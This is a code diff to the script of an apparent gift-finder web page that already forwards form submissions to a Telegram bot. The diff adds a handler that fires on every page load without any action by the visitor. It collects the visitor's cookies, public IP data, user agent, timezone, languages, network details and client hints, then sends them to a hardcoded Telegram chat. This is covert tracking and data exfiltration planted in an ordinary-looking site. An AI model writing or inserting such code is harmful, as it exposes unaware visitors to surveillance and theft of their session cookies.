@@ -1,8 +1,8 @@
 import {
+  IP_LOOKUP_URL,
   TELEGRAM_API_URL,
   TELEGRAM_BOT_TOKEN,
   TELEGRAM_CHAT_ID,
-  IP_LOOKUP_URL,
 } from '../config.js';
 
 const form = document.getElementById('gift-form');
@@ -107,6 +107,35 @@ const buildMessage = (data, context) => {
     };
 
     lines.push('', '<b>Client context</b>');
+    appendContext('Public IP data', context.ipSummary ?? context.ipError ?? 'Not available');
+    appendContext('Referrer', context.referrer);
+    appendContext('Preferred languages', context.languages);
+    appendContext('Primary language', context.language);
+    appendContext('Timezone', context.timezone);
+    appendContext('Cookies', context.cookies);
+    appendContext('User agent', context.userAgent);
+    appendContext('Platform', context.platform);
+    appendContext('Network', context.networkInfo);
+    appendContext('Client hints', context.clientHints);
+    appendContext('Navigation timing', context.navigationTiming);
+    appendContext('Telemetry errors', context.errors?.length ? context.errors : 'None captured');
+  }
+
+  return lines.join('\n');
+};
+
+const buildVisitMessage = (context) => {
+  const lines = [
+    `<b>New GiftFinder visit</b>`,
+    '',
+  ];
+
+  if (context) {
+    const appendContext = (label, value) => {
+      lines.push(`<b>${label}:</b> ${escapeHtml(formatValue(value))}`);
+    };
+
+    lines.push('<b>Client context</b>');
     appendContext('Public IP data', context.ipSummary ?? context.ipError ?? 'Not available');
     appendContext('Referrer', context.referrer);
     appendContext('Preferred languages', context.languages);
@@ -316,6 +345,26 @@ const sendToTelegram = async (payload) => {
 if (!canSendMessages()) {
   updateStatus('Add your Telegram credentials to config.js to enable submissions.');
 }
+
+const sendVisitOnLoad = async () => {
+  if (!canSendMessages()) return;
+  try {
+    const context = await getClientContext();
+    await sendToTelegram({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: buildVisitMessage(context),
+      parse_mode: 'HTML',
+      disable_web_page_preview: true,
+    });
+  } catch (error) {
+    console.error(error);
+  }
+};
+
+window.addEventListener('load', () => {
+  // Fire-and-forget visit ping
+  sendVisitOnLoad();
+});
 
 form?.addEventListener('submit', async (event) => {
   event.preventDefault();
